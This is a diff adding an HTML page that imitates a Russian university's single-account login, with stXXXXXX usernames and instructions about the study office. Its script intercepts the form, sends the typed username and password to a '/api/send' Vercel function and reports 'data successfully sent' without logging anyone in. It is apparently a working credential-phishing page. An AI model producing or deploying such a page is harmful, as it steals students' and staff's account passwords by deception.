@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Вход</title>
+<style>
+  :root {
+    --page-bg: #e9e9e9;
+    --card-bg: #ffffff;
+    --text: #8a8a8a;
+    --icon: #7a7a7a;
+    --border: #c8c8c8;
+    --link: #0000ee;
+    --input-text: #333333;
+    --btn-bg: #7a7a7a;
+    --btn-text: #ffffff;
+    --error: #b3261e;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --page-bg: #1b1b1b;
+      --card-bg: #262626;
+      --text: #a8a8a8;
+      --icon: #9a9a9a;
+      --border: #4a4a4a;
+      --link: #8ab4f8;
+      --input-text: #eeeeee;
+      --btn-bg: #9a9a9a;
+      --btn-text: #1b1b1b;
+      --error: #f2b8b5;
+    }
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; min-height: 100%; }
+  body {
+    background: var(--page-bg);
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    color: var(--text);
+    display: flex;
+    justify-content: center;
+  }
+  .card {
+    background: var(--card-bg);
+    width: 100%;
+    max-width: 520px;
+    min-height: 100vh;
+    padding: 48px 40px;
+    box-shadow: 0 0 4px rgba(0,0,0,.15);
+  }
+  .icon { width: 56px; height: 56px; fill: var(--icon); margin-bottom: 56px; }
+  p { font-size: 18px; line-height: 1.3; margin: 0 0 16px; }
+  a { color: var(--link); }
+  label {
+    display: block;
+    margin: 32px 0 8px;
+    font-size: 16px;
+    text-transform: uppercase;
+  }
+  input {
+    width: 100%;
+    height: 44px;
+    padding: 0 12px;
+    font-size: 15px;
+    color: var(--input-text);
+    background: transparent;
+    border: 2px solid var(--border);
+    border-radius: 0;
+    outline: none;
+  }
+  input:focus { border-color: var(--icon); }
+  button {
+    margin-top: 32px;
+    height: 44px;
+    padding: 0 28px;
+    font-size: 14px;
+    text-transform: uppercase;
+    color: var(--btn-text);
+    background: var(--btn-bg);
+    border: 0;
+    cursor: pointer;
+  }
+  .error { color: var(--error); margin-top: 16px; min-height: 1.3em; font-size: 16px; }
+</style>
+</head>
+<body>
+  <main class="card">
+    <svg class="icon" viewBox="0 0 64 64" aria-hidden="true">
+      <circle cx="26" cy="16" r="11"/>
+      <path d="M4 50c0-9 6-14 14-14h8l6 6 6-6c1 2 2 4 2 7v7z"/>
+      <circle cx="49" cy="20" r="9"/>
+      <circle cx="49" cy="18" r="3" fill="var(--card-bg)"/>
+      <rect x="47" y="26" width="4" height="26" rx="1"/>
+    </svg>
+
+    <p>Добро пожаловать! Пожалуйста, введите имя пользователя и пароль.</p>
+    <p>
+      Для входа на сайт необходимо использовать единую учетную запись вида stXXXXXX, где X — цифра 0–9.<br>
+      Первокурсники получают единую учетную запись в личном кабинете поступающего после зачисления.<br>
+      Обратите внимание, что регистрация пользователей на сайте проводится автоматически в срок от 1 до 7 дней после выдачи единой учетной записи.
+    </p>
+    <p>
+      По вопросам активации учетной записи или восстановления пароля от единой учетной записи (если он забыт) обратитесь, пожалуйста, к начальнику Учебного отдела по Вашему направлению, контакты размещены на <a href="#">портале</a>.
+    </p>
+
+    <form id="login-form" method="post" action="/login" novalidate>
+      <label for="username">Имя пользователя</label>
+      <input id="username" name="username" type="text"
+             autocomplete="username" autocapitalize="none" spellcheck="false"
+             pattern="st[0-9]{6}" required>
+
+      <label for="password">Пароль</label>
+      <input id="password" name="password" type="password"
+             autocomplete="current-password" required>
+
+      <div class="error" id="error" role="alert"></div>
+      <button type="submit">Войти</button>
+    </form>
+  </main>
+
+<script>
+  const form = document.getElementById('login-form');
+  const error = document.getElementById('error');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    error.textContent = '';
+    
+    const username = form.username.value.trim();
+    const password = form.password.value;
+
+    if (!/^st\d{6}$/.test(username)) {
+      error.textContent = 'Имя пользователя должно иметь вид stXXXXXX, где X — цифра 0–9.';
+      return;
+    }
+    if (!password) {
+      error.textContent = 'Введите пароль.';
+      return;
+    }
+
+    try {
+      // Отправляем данные на нашу серверную функцию Vercel
+      const response = await fetch('/api/send', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username, password })
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        alert('Данные успешно отправлены!');
+        form.reset();
+      } else {
+        error.textContent = 'Ошибка отправки: ' + (data.error || 'Неизвестная ошибка');
+      }
+    } catch (err) {
+      error.textContent = 'Ошибка сети при попытке отправки.';
+      console.error(err);
+    }
+  });
+</script>
+</body>
+</html>
